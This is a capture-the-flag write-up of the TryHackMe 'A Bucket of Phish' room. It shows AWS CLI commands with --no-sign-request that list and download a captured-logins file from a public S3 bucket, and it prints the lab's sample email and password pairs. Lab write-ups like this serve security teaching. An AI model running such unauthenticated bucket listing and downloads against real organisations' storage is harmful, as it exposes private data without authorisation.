---
title: A Bucket of Phish
categories: [TryHackMe]
tags: [aws]
media_subpath: /images/tryhackme_abucketofphish/
image:
  path: 'https://tryhackme-images.s3.amazonaws.com/room-icons/edb8226745b7607d851bd0258f31227c1cbdad254e1a2d574d97837321fa8e32.618b3fa52f0acc0061fb0172-1747849942798'
---

![NON](file-20250528234045382.png)

Looking at the website, we can sett that it is running using the `aws` service, so we can try to list some public informations on the website, like public buckets

```bash
aws s3 ls s3://darkinjector-phish --no-sign-request

2025-03-17 06:46:17        132 captured-logins-093582390
2025-03-17 06:25:33       2300 index.html
```

We can see two files, the `index` page of the website and a `captured-logins` file, where is possible to find the credentials captured along with the flag for this challenge

```bash
aws s3 cp s3://darkinjector-phish/captured-logins-093582390 ./ --no-sign-request
download: s3://darkinjector-phish/captured-logins-093582390 to ./captured-logins-093582390

cat captured-logins-093582390
user,pass
munra@thm.thm,Password123
test@thm.thm,123456
mario@thm.thm,Mario123
flag@thm.thm,<REDACTED>
```
